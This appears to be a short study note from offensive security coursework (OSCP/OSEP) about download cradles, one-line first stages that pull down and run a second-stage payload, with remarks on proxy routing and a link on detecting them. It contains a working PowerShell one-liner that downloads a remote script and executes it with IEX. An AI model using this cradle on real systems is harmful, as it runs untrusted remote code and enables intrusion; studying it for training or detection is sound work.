### Download Cradles

OSEP has shown a very strong bias to Windows oriented client side attacks so far. I do wonder if I'll ever get to discussing Linux Download Cradles...

Anywho, a Download Cradle is stage one. It is a one-liner that serves to pull down and run stage two, whatever that may be. Throughout OSCP the goto Windows Cradle was as follows:
```powershell
powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/run.ps1') | IEX
```

OSEP looks for us to advance on this by considering how this stage one download works, and how subtle it really is. The `DownloadString` invocation is not the issue per se, but rather we need to think about where the traffic resulting from that request is going. Namely we need to think about how and whether our traffic is being routed via a proxy on its way between the attack machine and the victim machine.

A side note of all this is the following note on detection engineering for download cradles. Not very relevant in the context of an offensive security course, however valuable to think about whenever we put our blue team hat on again: https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html

